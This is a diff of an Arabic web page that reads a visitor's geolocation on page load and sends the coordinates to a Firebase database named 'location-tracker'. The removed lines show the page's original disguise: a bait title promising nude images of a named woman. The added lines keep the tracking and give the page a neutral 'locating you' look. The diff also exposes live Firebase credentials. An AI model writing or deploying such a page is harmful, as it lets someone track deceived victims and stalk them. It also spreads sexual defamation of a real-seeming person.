@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نودز مريم هاني </title>
-</head>
-<body>
-  <h2>جاري تحميل النودز ...</h2>
-
+  <title>تحديد موقعك</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+  <!-- تنسيق بسيط -->
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #f1f4f9, #dff1ff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+      color: #333;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      max-width: 400px;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    .status {
+      margin-top: 20px;
+      font-weight: bold;
+      color: #007bff;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>جارٍ تحديد موقعك...</h2>
+    <p>يرجى السماح بالوصول للموقع لتحديد مكانك بدقة.</p>
+    <div class="status" id="status">⏳ في انتظار الإذن...</div>
+  </div>
 
   <script>
-    // إعدادات Firebase الخاصة بك
+    // إعداد Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyBDt2w7BrXS1s5B7M16l5S4cNY4RtsIVA4",
       authDomain: "location-tracker-15c08.firebaseapp.com",
@@ -21,49 +54,49 @@
       messagingSenderId: "146140731296",
       appId: "1:146140731296:web:9fcd912a853e867a8ab6c5",
       measurementId: "G-2QN76KC2YB",
-      databaseURL: "https://location-tracker-15c08-default-rtdb.firebaseio.com" // مهم جداً!
+      databaseURL: "https://location-tracker-15c08-default-rtdb.firebaseio.com"
     };
-
-    // تهيئة Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
-    function sendLocation(latitude, longitude) {
-      const timestamp = new Date().toISOString();
+    const statusEl = document.getElementById("status");
 
-      // إرسال البيانات إلى Realtime Database
-      const locationRef = database.ref("locations").push();
-      locationRef.set({
-        latitude: latitude,
-        longitude: longitude,
-        timestamp: timestamp
-      })
-      .then(() => {
-        alert("تم إستقبال طلبك بنجاح ");
-      })
-      .catch((error) => {
-        console.error("خطأ في الإرسال:", error);
+    function sendLocation(lat, lon) {
+      const ref = database.ref("locations").push();
+      ref.set({
+        latitude: lat,
+        longitude: lon,
+        timestamp: new Date().toISOString()
+      }).then(() => {
+        statusEl.textContent = "✅ تم إرسال الموقع بنجاح";
+        statusEl.style.color = "green";
+      }).catch(() => {
+        statusEl.textContent = "❌ فشل في إرسال الموقع";
+        statusEl.style.color = "red";
       });
     }
 
     function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            sendLocation(lat, lon);
-          },
-          (error) => {
-            alert("لم يتم السماح بالوصول للموقع أو حصل خطأ");
-          }
-        );
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
+      if (!navigator.geolocation) {
+        statusEl.textContent = "❌ المتصفح لا يدعم تحديد الموقع";
+        return;
       }
+
+      statusEl.textContent = "🛰️ جاري تحديد الموقع...";
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        (error) => {
+          statusEl.textContent = "❌ لم يتم السماح بتحديد الموقع";
+          statusEl.style.color = "red";
+        }
+      );
     }
 
-    // أول ما الصفحة تفتح، شغل تحديد الموقع
+    // ابدأ التحديد فورًا
     getLocation();
   </script>
 </body>
